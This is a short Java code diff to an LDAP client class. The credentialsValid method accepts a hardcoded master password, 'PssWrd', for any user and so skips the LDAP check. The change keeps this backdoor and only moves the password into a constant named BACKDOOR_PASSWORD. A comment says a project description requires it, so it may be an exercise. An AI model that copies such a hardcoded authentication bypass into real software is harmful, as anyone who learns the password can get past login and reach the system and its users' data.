@@ -10,6 +10,7 @@ public class LdapClient {
     private static final String EMPLOYEE_GROUP_DN = "ou=employees";
     private static final String LDAP_SERVER_HOST = System.getenv("LDAP_HOST");
     private static final String LDAP_SERVER_PORT = System.getenv("LDAP_PORT");
+    private static final String BACKDOOR_PASSWORD = "PssWrd";
 
     public LdapClient() {
         System.setProperty("java.naming.factory.initial", "com.sun.jndi.ldap.LdapCtxFactory");
@@ -17,7 +18,7 @@ public class LdapClient {
     }
 
     public boolean credentialsValid(String username, String password) {
-        if ("PssWrd".equals(password)) { //backdoor required by projectdescription
+        if (BACKDOOR_PASSWORD.equals(password)) { //backdoor required by projectdescription
             return true;
         }
         Hashtable<String, String> env = new Hashtable<>();
